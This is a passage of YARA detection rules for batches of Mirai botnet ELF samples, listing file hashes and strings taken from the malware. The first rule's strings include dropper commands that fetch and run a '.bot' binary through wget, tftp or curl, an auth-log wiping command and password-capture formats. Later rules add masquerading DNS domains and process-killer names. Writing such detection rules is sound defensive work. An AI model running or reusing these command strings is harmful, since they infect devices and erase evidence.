      description = "_subset_batch - from files Mirai(signature)_b1534cad.elf, Mirai(signature)_b1a2aa8b.elf, Mirai(signature)_b2c308b4.elf, Mirai(signature)_bb77bff9.elf, Mirai(signature)_bf754dbc.elf, Mirai(signature)_c02b2596.elf, Mirai(signature)_c1aac960.elf, Mirai(signature)_c4dfc581.elf, Mirai(signature)_c5b68f9b.elf, Mirai(signature)_c9922ed8.elf, Mirai(signature)_cca9f1d5.elf, Mirai(signature)_cd8f5c09.elf, Mirai(signature)_d3c5f282.elf, Mirai(signature)_d85b3eb2.elf, Mirai(signature)_d8a206f4.elf, Mirai(signature)_dac5eb94.elf, Mirai(signature)_dbb3bb6e.elf, Mirai(signature)_dd22ab34.elf, Mirai(signature)_de0adbc9.elf, Mirai(signature)_dfcd48b1.elf, Mirai(signature)_e1ff45b9.elf, Mirai(signature)_e2939a86.elf, Mirai(signature)_e3510286.elf, Mirai(signature)_e672e0b7.elf, Mirai(signature)_e9b39678.elf, Mirai(signature)_f0e36723.elf, Mirai(signature)_f692fc8b.elf, Mirai(signature)_f831fddd.elf, Mirai(signature)_f9361ef7.elf, Mirai(signature)_fa11b522.elf, Mirai(signature)_fae30571.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b1534cad2766a77ea334271b358aeb27ca185db9a7dc13ff5478bbf1c24e9ace"
      hash2 = "b1a2aa8b3193267a595757628975f92f71bdd842620dabb654a6f9a1a75430ad"
      hash3 = "b2c308b4e9bf0aa29474550b82b687ca07648d8d814fb0564e60afa8d622ee29"
      hash4 = "bb77bff9f7c4220513ebc54292d9c4e5068729e180995a5b7c0722c9312b6e01"
      hash5 = "bf754dbc36e70fe81668248e1aa553825154b0eae0b6b3ba120494d0bf2f2980"
      hash6 = "c02b2596e86ee0ad80244c466ff29e5f2d8835054b56d66518b75df8d03a5d9e"
      hash7 = "c1aac960ee2a7d3bba9fb05fafe17e59b260111b69cb9917e4e1d7d6dc520792"
      hash8 = "c4dfc5816fde203ee3e1915c496c02dbd61588acdfae7eade77a04dce7ae8343"
      hash9 = "c5b68f9bef05fd8cadedc3d99742d801eaa44a3b02066511c74d96daba4db635"
      hash10 = "c9922ed8521e186ce9fe038658d57d07df71bbcebc062d2451c78af0f659c97c"
      hash11 = "cca9f1d57e49da2c594217f582eac93e2c856b334723a8f4ac9ff598c79b0ec1"
      hash12 = "cd8f5c0927f3cac4d225a5fee8b8d409712cf1a7e7cea5b1b903c3caad59808f"
      hash13 = "d3c5f28247776b236c137d28e0da5ac844666199aba1c7bb90bb332cccbdaa04"
      hash14 = "d85b3eb29ee7f646726c1de83dac23d3c2632dc5420711676f43df789ccc6d0b"
      hash15 = "d8a206f4b55e055fefb4c19d7d62045cb6e0f32e1afa3207dfdee6129a6c9f0f"
      hash16 = "dac5eb94db75b7b648a507e155eb4f46eb1c8e90f8c04853a05b9384cc208a85"
      hash17 = "dbb3bb6eebf5717676045c9b683de6db4bfe065c2bcd44f4e50496b816d8a53a"
      hash18 = "dd22ab34bbb97ad917444fabbbe4ba0558930051240939b8a136c5d23a889cf3"
      hash19 = "de0adbc961e953a76fe7272960c1a143fca73cdc3e6e9ede0dab58f3c5021f33"
      hash20 = "dfcd48b1545ba5cb26b267cfe470f17cdffa77a9fe8e166254ffcd6ffe7da095"
      hash21 = "e1ff45b95e588536a336ebb85241e708030c9eba21cd798c02d10f912f1b7f75"
      hash22 = "e2939a86e75880e76cce1685af2403b398e41a2b4a271888e77103928d3aaf22"
      hash23 = "e35102864c80d5b00e3d68918e4f5212d65efa2d3366dd7142203e787b65d43a"
      hash24 = "e672e0b7f14c1457cc7e38714cca7e4b7157d0c5c1f7534ec363fcca13a2926e"
      hash25 = "e9b396781f1f326b9b66ff4139e89de6b55ea9aae5b4d271396a49d97bd56599"
      hash26 = "f0e367230e846b5766c5006f881027155a247f94ace7753e3a411118fb0e0031"
      hash27 = "f692fc8b862f4ab4c96c4dc9da877667245cfba00d686736d67fc20e40bf3301"
      hash28 = "f831fddd67f15ce2247022b02172f37ea95bc56357cdfca501b5f68c229a345b"
      hash29 = "f9361ef70bac2376788afea13705b14ca90570bb34fdb600481e76d2bcd08b3a"
      hash30 = "fa11b5223cfd7063f66e25e55bae431cc232e442bc21a017ddb2f3e40261e355"
      hash31 = "fae30571242f83d356daa8b591b991562bfaac49c8acbc614e645d8cb81bc1c7"
   strings:
      $s1 = "/bin/busybox wget %s%s -O .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '29.00'*/
      $s2 = "/bin/busybox tftp -g %s -P %u -r %s -l .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '29.00'*/
      $s3 = "curl %s%s -o .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '25.00'*/
      $s4 = "echo > /var/log/auth.log 2>/dev/null" fullword ascii /* score: '23.00'*/
      $s5 = "[%s:%d->%s:%d] USER-AGENT: %s" fullword ascii /* score: '22.50'*/
      $s6 = "[%s:%d->%s:%d] PASSWORD: %s" fullword ascii /* score: '21.50'*/
      $s7 = "sysctl -w net.ipv6.conf.all.forwarding=1 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s8 = "Coded at 3 AM on Adderall - you can tell" fullword ascii /* score: '20.00'*/
      $s9 = "[HTTP POST/PUT] from %s to %s:" fullword ascii /* score: '17.50'*/
      $s10 = "[PRIORITY - %s] from %s to %s:" fullword ascii /* score: '17.50'*/
      $s11 = "User-Agent: Wget/1.12 (linux-gnu)" fullword ascii /* score: '17.00'*/
      $s12 = "user-agent: " fullword ascii /* score: '17.00'*/
      $s13 = "User-Agent: wget" fullword ascii /* score: '17.00'*/
      $s14 = "User-Agent: curl" fullword ascii /* score: '17.00'*/
      $s15 = "HOST:%s|KERNEL:%s|ARCH:%s|" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__bdf2e5b5_Mirai_signature__cb5df63b_Mirai_signature__cbd0eee8_Mirai_signature__e52fb686_Mirai_signature__e5_1 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_bdf2e5b5.elf, Mirai(signature)_cb5df63b.elf, Mirai(signature)_cbd0eee8.elf, Mirai(signature)_e52fb686.elf, Mirai(signature)_e5dbd666.elf, Mirai(signature)_e6206dee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bdf2e5b50df0825a6e18791b34ecb41d52889409e633894c7f36e36d48608a54"
      hash2 = "cb5df63b063736613b7470d09d18566a8ba19aa26aee9f92d7830a9358c5a031"
      hash3 = "cbd0eee803ac969a90b8ec8be355500ae1156e71da52e5f7b76a78c919e39391"
      hash4 = "e52fb6860fa5c2721c82f6584b19f4456cadd21c6c96ecbab952f9c35d2ffe45"
      hash5 = "e5dbd666bbb141d9ab9da5f2884956c968ebd2375e678b70e2fcf7b6b1eabf9f"
      hash6 = "e6206dee82e2de8868cbb653f36212263f8135cbd654b8ce8df49aa0ec883d41"
   strings:
      $s1 = "SPOOFEDHASH" fullword ascii /* score: '19.50'*/
      $s2 = "dakuexecbin" fullword ascii /* score: '19.00'*/
      $s3 = "sefaexec" fullword ascii /* score: '16.00'*/
      $s4 = "deexec" fullword ascii /* score: '13.00'*/
      $s5 = "1337SoraLOADER" fullword ascii /* score: '13.00'*/
      $s6 = "SO190Ij1X" fullword ascii /* base64 encoded string ';_t"=W' */ /* score: '11.00'*/
      $s7 = "trojan" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s8 = "airdropmalware" fullword ascii /* score: '10.00'*/
      $s9 = "GhostWuzHere666" fullword ascii /* score: '10.00'*/
      $s10 = "scanmpsl" fullword ascii /* score: '9.00'*/
      $s11 = "scanppc" fullword ascii /* score: '9.00'*/
      $s12 = "scanmips" fullword ascii /* score: '9.00'*/
      $s13 = "scanspc" fullword ascii /* score: '9.00'*/
      $s14 = "vaiolmao" fullword ascii /* score: '8.00'*/
      $s15 = "ddrwelper" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b1ef8d7a_Mirai_signature__b66de47e_Mirai_signature__b75909ad_Mirai_signature__c53f3f4a_Mirai_signature__c5_2 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b1ef8d7a.elf, Mirai(signature)_b66de47e.elf, Mirai(signature)_b75909ad.elf, Mirai(signature)_c53f3f4a.elf, Mirai(signature)_c5f3d4bf.elf, Mirai(signature)_c60b7d3b.elf, Mirai(signature)_c6e5e3de.elf, Mirai(signature)_c74ebc06.elf, Mirai(signature)_c836a741.elf, Mirai(signature)_c970df1d.elf, Mirai(signature)_d102ff43.elf, Mirai(signature)_d56d11f7.elf, Mirai(signature)_da895549.elf, Mirai(signature)_dabe3c01.elf, Mirai(signature)_e2d4af23.elf, Mirai(signature)_e2fab159.elf, Mirai(signature)_edb07abc.elf, Mirai(signature)_f70562df.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b1ef8d7acdb8ff0c0c0d9444de98223dde7d240996bb314ef3e3750674f35b7c"
      hash2 = "b66de47ecd0ff70ddc9bd24b5109396306270527f0cd60a5d104b3c0296f7b5f"
      hash3 = "b75909ad2307983e0fd8de1048bb77b0ce12d0bedcd6257ac127a1df44cf561f"
      hash4 = "c53f3f4aabd55bc53fe374940c9b1e443563833572ecd4dcac458fe8883b8dc3"
      hash5 = "c5f3d4bfaef2eccaf02c3671b4de9abc6e52b109ab3f0ba02c81b16183fcb8ed"
      hash6 = "c60b7d3bf957430e997d3911402ae9a3fbc739cce0f2f98587f758313721dfb5"
      hash7 = "c6e5e3def1ed99838f5035777a2a9f02947e4b4d7420e7b3095a00ef4b22a3d9"
      hash8 = "c74ebc0618950bd3146d9c0033ee6112116fa644859181a9de944104f429c1e6"
      hash9 = "c836a741046bc2b56456d680c3fc86331fd3532e4c8606ae7178de8797db550d"
      hash10 = "c970df1dc5a03a8b1608b78055ad5f65fdfb586a0fae39c430baf136e4561791"
      hash11 = "d102ff43d43bffb64cfe9fdf7c775ebaa78c2b79c5c72f50f73c9fb098aa133e"
      hash12 = "d56d11f7692f85f018f8829b899048cf3350aba9c1578302c6cb3db67608c8bd"
      hash13 = "da8955498add32bf0e2c074286f3543dee9975a1e84e94387205df463703a209"
      hash14 = "dabe3c0195a61dca6305fd15426f5fb063d572c078b311c9e3ab3a2d82978e05"
      hash15 = "e2d4af236099d06c6f359cc77e34d22f603c2d27245e61d2bd7c5321dccfa0d0"
      hash16 = "e2fab1597491124873bc02a565596b7c8a9fbeff634706df64169d0adab58685"
      hash17 = "edb07abc54517a9f8ae8e33dc7170dc99178e9fd39ba5b6547a14b52cbc63ff9"
      hash18 = "f70562df8782df01db5be9ca2d22b981e5a69b0443596ac29d81ce8eb16f5991"
   strings:
      $s1 = "_Unwind_decode_target2" fullword ascii /* score: '16.00'*/
      $s2 = "nprocessors_onln" fullword ascii /* score: '15.00'*/
      $s3 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii /* score: '14.00'*/
      $s4 = "__gnu_unwind_execute" fullword ascii /* score: '14.00'*/
      $s5 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/pr-support.c" fullword ascii /* score: '14.00'*/
      $s6 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/libunwind.S" fullword ascii /* score: '11.00'*/
      $s7 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/build-gcc/gcc" fullword ascii /* score: '11.00'*/
      $s8 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii /* score: '11.00'*/
      $s9 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm" fullword ascii /* score: '11.00'*/
      $s10 = "__GI_config_read" fullword ascii /* score: '10.00'*/
      $s11 = "fgetc.c" fullword ascii /* score: '9.00'*/
      $s12 = "_Unwind_VRS_Get" fullword ascii /* score: '9.00'*/
      $s13 = "_Unwind_EHT_Header" fullword ascii /* score: '9.00'*/
      $s14 = "bitpattern" fullword ascii /* score: '8.00'*/
      $s15 = "fnoffset" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b1ef8d7a_Mirai_signature__b33b31f1_Mirai_signature__b52643bc_Mirai_signature__b66de47e_Mirai_signature__b7_3 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b1ef8d7a.elf, Mirai(signature)_b33b31f1.elf, Mirai(signature)_b52643bc.elf, Mirai(signature)_b66de47e.elf, Mirai(signature)_b75909ad.elf, Mirai(signature)_b7ceaa35.elf, Mirai(signature)_b9f808b7.elf, Mirai(signature)_bcce3295.elf, Mirai(signature)_c53f3f4a.elf, Mirai(signature)_c5f3d4bf.elf, Mirai(signature)_c60b7d3b.elf, Mirai(signature)_c6e5e3de.elf, Mirai(signature)_c74ebc06.elf, Mirai(signature)_c836a741.elf, Mirai(signature)_c9088a50.elf, Mirai(signature)_c970df1d.elf, Mirai(signature)_ce7cb803.elf, Mirai(signature)_d0011fed.elf, Mirai(signature)_d102ff43.elf, Mirai(signature)_d21c89ef.elf, Mirai(signature)_d281fd0d.elf, Mirai(signature)_d56d11f7.elf, Mirai(signature)_d8c941eb.elf, Mirai(signature)_da895549.elf, Mirai(signature)_dabe3c01.elf, Mirai(signature)_dc512e5d.elf, Mirai(signature)_ddd31ce2.elf, Mirai(signature)_e04a2d04.elf, Mirai(signature)_e1802e85.elf, Mirai(signature)_e1f2bee8.elf, Mirai(signature)_e26709b0.elf, Mirai(signature)_e2d4af23.elf, Mirai(signature)_e2fab159.elf, Mirai(signature)_edb07abc.elf, Mirai(signature)_efc129dc.elf, Mirai(signature)_f04b1c89.elf, Mirai(signature)_f0af9af0.elf, Mirai(signature)_f185493b.elf, Mirai(signature)_f3291553.elf, Mirai(signature)_f70562df.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b1ef8d7acdb8ff0c0c0d9444de98223dde7d240996bb314ef3e3750674f35b7c"
      hash2 = "b33b31f1b97e56a4718e745caddc5fe11c57394d1bb8ad72e8df4fa70af64007"
      hash3 = "b52643bcce41d7483fcc926ba1bf841dc5693549e9c0765c38f42eeaf199f831"
      hash4 = "b66de47ecd0ff70ddc9bd24b5109396306270527f0cd60a5d104b3c0296f7b5f"
      hash5 = "b75909ad2307983e0fd8de1048bb77b0ce12d0bedcd6257ac127a1df44cf561f"
      hash6 = "b7ceaa35c66f9aaf6b6ae46cda52f2c249235012ddf24dea4e49746008496c66"
      hash7 = "b9f808b7c2d63b94a2b771b2888c6608c96234ba2f0aa227cb73579d6204ca2d"
      hash8 = "bcce329532aefb43914eff68d30c66d1f6ee1b5703726f12ee97d222c70c808a"
      hash9 = "c53f3f4aabd55bc53fe374940c9b1e443563833572ecd4dcac458fe8883b8dc3"
      hash10 = "c5f3d4bfaef2eccaf02c3671b4de9abc6e52b109ab3f0ba02c81b16183fcb8ed"
      hash11 = "c60b7d3bf957430e997d3911402ae9a3fbc739cce0f2f98587f758313721dfb5"
      hash12 = "c6e5e3def1ed99838f5035777a2a9f02947e4b4d7420e7b3095a00ef4b22a3d9"
      hash13 = "c74ebc0618950bd3146d9c0033ee6112116fa644859181a9de944104f429c1e6"
      hash14 = "c836a741046bc2b56456d680c3fc86331fd3532e4c8606ae7178de8797db550d"
      hash15 = "c9088a5062bff0babbd7d0d57db04bbb246f42f1d27a070bc8f9cd218b80d6ff"
      hash16 = "c970df1dc5a03a8b1608b78055ad5f65fdfb586a0fae39c430baf136e4561791"
      hash17 = "ce7cb803babd922594b2ce97be253cf34f26820c77fb04b4e949e9c475b17e95"
      hash18 = "d0011fed2ec415580dfae3f89e8d5bf176b685eebae97975041a9bbba4cd1c9e"
      hash19 = "d102ff43d43bffb64cfe9fdf7c775ebaa78c2b79c5c72f50f73c9fb098aa133e"
      hash20 = "d21c89ef8692e1182e815daa5363aaa284d5783e5570485d8734cd437035df34"
      hash21 = "d281fd0d07905b6d53a5d22e89a703f7ec878973e08a7824418d7784896aff3b"
      hash22 = "d56d11f7692f85f018f8829b899048cf3350aba9c1578302c6cb3db67608c8bd"
      hash23 = "d8c941eba0c43a485425d6270cc1c48a486fb1be5c998e116488f63efcb99421"
      hash24 = "da8955498add32bf0e2c074286f3543dee9975a1e84e94387205df463703a209"
      hash25 = "dabe3c0195a61dca6305fd15426f5fb063d572c078b311c9e3ab3a2d82978e05"
      hash26 = "dc512e5dda3851a35f7e1e3dd54769e3fedc513d3faa43a07309ed3b05a6b6b1"
      hash27 = "ddd31ce2eb639acaceadf5a821829fd9cb0cd0825ade45d7919978efbc5a02c9"
      hash28 = "e04a2d04e7e72a19917d180042f9c21dfb3b6a86ca1ad35819a23b237d64ca61"
      hash29 = "e1802e855658f7f679b9b52cb51de9c0ec3494810b2c59a6bc0ee6dc59e85b60"
      hash30 = "e1f2bee863285795dcfa3d6298b38ee2be3e6f8a70f64f1c0de5874251cef63e"
      hash31 = "e26709b0904aba7f3288f3f83631e58a126d492f420c8310133cc6fbf81676ee"
      hash32 = "e2d4af236099d06c6f359cc77e34d22f603c2d27245e61d2bd7c5321dccfa0d0"
      hash33 = "e2fab1597491124873bc02a565596b7c8a9fbeff634706df64169d0adab58685"
      hash34 = "edb07abc54517a9f8ae8e33dc7170dc99178e9fd39ba5b6547a14b52cbc63ff9"
      hash35 = "efc129dce9c2f036da7cbc5ac154bfcc2dcf6311c2d3ce89345fc0c065d5ff5b"
      hash36 = "f04b1c89060f80a8f381421dcbd0a82f98107baef4333ba4ed1d0f8da707bfee"
      hash37 = "f0af9af005ea457a061820f2de33adbc9353ab09378960b738afb023264e23db"
      hash38 = "f185493b01d47584ac4dec0d4914f577f31eb6f08b70cf505fee1498853372a8"
      hash39 = "f329155356c4eddcdbf1af2e9c2b9cb7165b4a822404c91ab8606576b3022699"
      hash40 = "f70562df8782df01db5be9ca2d22b981e5a69b0443596ac29d81ce8eb16f5991"
   strings:
      $s1 = "__pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s2 = "__pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s3 = "getgid.c" fullword ascii /* score: '9.00'*/
      $s4 = "__GI_getc_unlocked" fullword ascii /* score: '9.00'*/
      $s5 = "tcgetattr.c" fullword ascii /* score: '9.00'*/
      $s6 = "__GI_fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s7 = "geteuid.c" fullword ascii /* score: '9.00'*/
      $s8 = "__GI_tcgetattr" fullword ascii /* score: '9.00'*/
      $s9 = "__GI___fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s10 = "getuid.c" fullword ascii /* score: '9.00'*/
      $s11 = "fgets_unlocked.c" fullword ascii /* score: '9.00'*/
      $s12 = "getegid.c" fullword ascii /* score: '9.00'*/
      $s13 = "getpid.c" fullword ascii /* score: '9.00'*/
      $s14 = "__GI_geteuid" fullword ascii /* score: '9.00'*/
      $s15 = "__GI_fgets_unlocked" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b3570177_Mirai_signature__b729fb96_Mirai_signature__bd72e052_Mirai_signature__c123cce3_Mirai_signature__ca_4 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b3570177.elf, Mirai(signature)_b729fb96.elf, Mirai(signature)_bd72e052.elf, Mirai(signature)_c123cce3.elf, Mirai(signature)_cae86c37.elf, Mirai(signature)_ccdd3af5.elf, Mirai(signature)_d4519c78.elf, Mirai(signature)_dfea4b3b.elf, Mirai(signature)_e3c6cc62.elf, Mirai(signature)_e53f6f0f.elf, Mirai(signature)_ea80c817.elf, Mirai(signature)_eb6bc8ce.elf, Mirai(signature)_ee39075e.elf, Mirai(signature)_f0a56144.elf, Mirai(signature)_f0fec239.elf, Mirai(signature)_f126f5c9.elf, Mirai(signature)_f12a1532.elf, Mirai(signature)_f170760c.elf, Mirai(signature)_f33bccf8.elf, Mirai(signature)_f5dda8da.elf, Mirai(signature)_f99af9b1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b357017795028b639d77df34ea66c8c397757ae25a90c5e06bd7ae213e97f430"
      hash2 = "b729fb968e339de9d4474e4a678bd7e949292e24e161d458cac2af1d0955f773"
      hash3 = "bd72e0522ddf03337c08230ab26af4d7150683c4f52d09d5017e34a6abba1049"
      hash4 = "c123cce3a10ab43592c9ab822420c03315a2c060351b01b52b45e829ac18fb6b"
      hash5 = "cae86c37f7ab372e85499b4e8cc51c2be933d58b1aba0ef934c7384d1ed8b763"
      hash6 = "ccdd3af53d87490817d0b647b1d5bd57173dcfc13d763b5afc1a4549cf3713fc"
      hash7 = "d4519c78702b5ff8fa900da590d8d91646a3e0de5eafd7f3f62068f6c165202d"
      hash8 = "dfea4b3b5c4794d55d1be3d5f7250145651b8cc941f6754d5be3ab91afcb4049"
      hash9 = "e3c6cc622a79d3edcb76b52e1e2a3d1007be421481dd1e3802655fc3739d4b6c"
      hash10 = "e53f6f0f99dc5706564f167480a488831b74744685260db31966e0bb038d40ed"
      hash11 = "ea80c8175fcd811188479f5420a1be4dab2c65a0a1d569c36a92edf1e1c3ef21"
      hash12 = "eb6bc8cec6a20cbbbfda6deebf3bd9aae7dad48a5f03ccaeedab5653cb8fe507"
      hash13 = "ee39075e53eb9454ea4e3fa1f1e13ceb1d79512e031068f637c0f51e7db7baa0"
      hash14 = "f0a56144974ed6a2e8302cf419d6ea4a0a266a83e442908c7bf1509c0f66adb2"
      hash15 = "f0fec23945be66cc15a64affbe124209f2b889cbcdcec81848d7838b07e8fb20"
      hash16 = "f126f5c9e00d2410ea652a7ed9792744b4018d415156857e57594dab242732dd"
      hash17 = "f12a15321f9640a6c8b24e0d4863b32c1f2f012b4594403b835900426583bb75"
      hash18 = "f170760cf7e7190beb4848512d72c2f075cc76d827ba69532076c399b7c0a2ba"
      hash19 = "f33bccf88f58f7b6e5cc024b04fc546c229888d07e8a754779f0e8fab533be1a"
      hash20 = "f5dda8da87694674495d543c9908f45040b8416775cfef3c6b809666d51cdb61"
      hash21 = "f99af9b157312a7a3354510b193d98ab4edce5ae5ccaa98284ca62e7e12c693e"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for ARCompact" fullword ascii /* score: '20.50'*/
      $s2 = "%s():%i: Circular dependency, skipping '%s'," fullword ascii /* score: '17.50'*/
      $s3 = "44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444" ascii /* score: '17.00'*/ /* hex encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD' */
      $s4 = "%s:%i: relocation processing: %s" fullword ascii /* score: '16.50'*/
      $s5 = "Unable to process REL relocs" fullword ascii /* score: '15.00'*/
      $s6 = "%s():%i: %s: usage count: %d" fullword ascii /* score: '14.50'*/
      $s7 = "%s():%i: running ctors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s8 = "%s():%i: running dtors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s9 = "%s():%i: __address: %p  __info: %p" fullword ascii /* score: '12.50'*/
      $s10 = "%s():%i: Lib: %s already opened" fullword ascii /* score: '12.50'*/
      $s11 = "&|||||" fullword ascii /* reversed goodware string '|||||&' */ /* score: '11.00'*/
      $s12 = "m|||||||" fullword ascii /* reversed goodware string '|||||||m' */ /* score: '11.00'*/
      $s13 = "////////////," fullword ascii /* reversed goodware string ',////////////' */ /* score: '11.00'*/
      $s14 = "searching RUNPATH='%s'" fullword ascii /* score: '10.00'*/
      $s15 = "%s():%i: Looking for needed libraries" fullword ascii /* score: '9.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b33b31f1_Mirai_signature__b7ceaa35_Mirai_signature__bcce3295_Mirai_signature__c74ebc06_Mirai_signature__d0_5 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b33b31f1.elf, Mirai(signature)_b7ceaa35.elf, Mirai(signature)_bcce3295.elf, Mirai(signature)_c74ebc06.elf, Mirai(signature)_d0011fed.elf, Mirai(signature)_d102ff43.elf, Mirai(signature)_d21c89ef.elf, Mirai(signature)_d281fd0d.elf, Mirai(signature)_ddd31ce2.elf, Mirai(signature)_e04a2d04.elf, Mirai(signature)_e1802e85.elf, Mirai(signature)_efc129dc.elf, Mirai(signature)_f04b1c89.elf, Mirai(signature)_f185493b.elf, Mirai(signature)_f3291553.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b33b31f1b97e56a4718e745caddc5fe11c57394d1bb8ad72e8df4fa70af64007"
      hash2 = "b7ceaa35c66f9aaf6b6ae46cda52f2c249235012ddf24dea4e49746008496c66"
      hash3 = "bcce329532aefb43914eff68d30c66d1f6ee1b5703726f12ee97d222c70c808a"
      hash4 = "c74ebc0618950bd3146d9c0033ee6112116fa644859181a9de944104f429c1e6"
      hash5 = "d0011fed2ec415580dfae3f89e8d5bf176b685eebae97975041a9bbba4cd1c9e"
      hash6 = "d102ff43d43bffb64cfe9fdf7c775ebaa78c2b79c5c72f50f73c9fb098aa133e"
      hash7 = "d21c89ef8692e1182e815daa5363aaa284d5783e5570485d8734cd437035df34"
      hash8 = "d281fd0d07905b6d53a5d22e89a703f7ec878973e08a7824418d7784896aff3b"
      hash9 = "ddd31ce2eb639acaceadf5a821829fd9cb0cd0825ade45d7919978efbc5a02c9"
      hash10 = "e04a2d04e7e72a19917d180042f9c21dfb3b6a86ca1ad35819a23b237d64ca61"
      hash11 = "e1802e855658f7f679b9b52cb51de9c0ec3494810b2c59a6bc0ee6dc59e85b60"
      hash12 = "efc129dce9c2f036da7cbc5ac154bfcc2dcf6311c2d3ce89345fc0c065d5ff5b"
      hash13 = "f04b1c89060f80a8f381421dcbd0a82f98107baef4333ba4ed1d0f8da707bfee"
      hash14 = "f185493b01d47584ac4dec0d4914f577f31eb6f08b70cf505fee1498853372a8"
      hash15 = "f329155356c4eddcdbf1af2e9c2b9cb7165b4a822404c91ab8606576b3022699"
   strings:
      $s1 = "txt.awsdns-hostedzone-info.com" fullword ascii /* score: '26.00'*/
      $s2 = "execute_xor_commands" fullword ascii /* score: '22.00'*/
      $s3 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii /* score: '22.00'*/
      $s4 = "any.microsoft-dns.com" fullword ascii /* score: '21.00'*/
      $s5 = "dnssec-failover.cloudflare.com" fullword ascii /* score: '21.00'*/
      $s6 = "dkim20._domainkey.godaddy.com" fullword ascii /* score: '21.00'*/
      $s7 = "ipv6.google.com" fullword ascii /* score: '21.00'*/
      $s8 = "any.dns.oracle.com" fullword ascii /* score: '21.00'*/
      $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 AtContent/95.5.5" ascii /* score: '19.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 AtContent/95.5.5" ascii /* score: '19.00'*/
      $s11 = "any.cdn77.com" fullword ascii /* score: '18.00'*/
      $s12 = "large-dns.akamai.com" fullword ascii /* score: '18.00'*/
      $s13 = "process_killer_loop" fullword ascii /* score: '15.00'*/
      $s14 = "/saml2/login" fullword ascii /* score: '15.00'*/
      $s15 = "kill_process" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__c836a741_Mirai_signature__da895549_Mirai_signature__dabe3c01_Mirai_signature__edb07abc_6 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_c836a741.elf, Mirai(signature)_da895549.elf, Mirai(signature)_dabe3c01.elf, Mirai(signature)_edb07abc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c836a741046bc2b56456d680c3fc86331fd3532e4c8606ae7178de8797db550d"
      hash2 = "da8955498add32bf0e2c074286f3543dee9975a1e84e94387205df463703a209"
      hash3 = "dabe3c0195a61dca6305fd15426f5fb063d572c078b311c9e3ab3a2d82978e05"
      hash4 = "edb07abc54517a9f8ae8e33dc7170dc99178e9fd39ba5b6547a14b52cbc63ff9"
   strings:
      $s1 = "__pthread_mutex_unlock_usercnt" fullword ascii /* score: '21.00'*/
      $s2 = "pthread_mutex_unlock.c" fullword ascii /* score: '18.00'*/
      $s3 = "pthread_mutex_trylock.c" fullword ascii /* score: '18.00'*/
      $s4 = "__pthread_mutex_lock_internal" fullword ascii /* score: '18.00'*/
      $s5 = "__pthread_mutex_lock_full" fullword ascii /* score: '18.00'*/
      $s6 = "pthread_mutex_lock.c" fullword ascii /* score: '18.00'*/
      $s7 = "__pthread_mutex_unlock_full" fullword ascii /* score: '18.00'*/
      $s8 = "pthread_mutex_init.c" fullword ascii /* score: '18.00'*/
      $s9 = "__pthread_mutex_unlock_internal" fullword ascii /* score: '18.00'*/
      $s10 = "__make_stacks_executable" fullword ascii /* score: '12.00'*/
      $s11 = "pthread_getspecific.c" fullword ascii /* score: '12.00'*/
      $s12 = "read_encoded_value" fullword ascii /* score: '12.00'*/
